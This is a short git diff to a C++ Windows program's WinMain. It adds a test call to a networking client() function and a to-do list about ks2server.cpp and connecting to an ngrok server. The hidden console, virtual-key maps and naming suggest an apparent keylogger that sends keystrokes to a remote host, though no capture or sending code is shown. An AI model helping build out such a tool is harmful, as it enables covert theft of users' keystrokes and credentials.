@@ -38,7 +38,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     PSTR lpCmdLine, int nCmdShow)
 {
     //FreeConsole();
+    // testing client networking function.
     client();
+    return 1;
     Maps vkMaps;
     vkMaps.initializeMaps();
     while (1)
@@ -80,5 +82,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 
     To-Do list
 
-    ~ fix ks2server.cpp, it will not compile because I have incorrectly written the code.
+    in ks2server.cpp:
+    ~ ensure all code is written safely and clearly, check for variable names and provide more explanation in documentation for the choice of filename "ks2server.cpp".
+    ~ check and see if client() is able to connect to an ngrok server and port.
+    ~ provide clear explanations to user for any if statements checking for any WSA errors.
+    ~ check documentation for ALL code files to ensure everything is written clearly, and concisely. 
+
 */
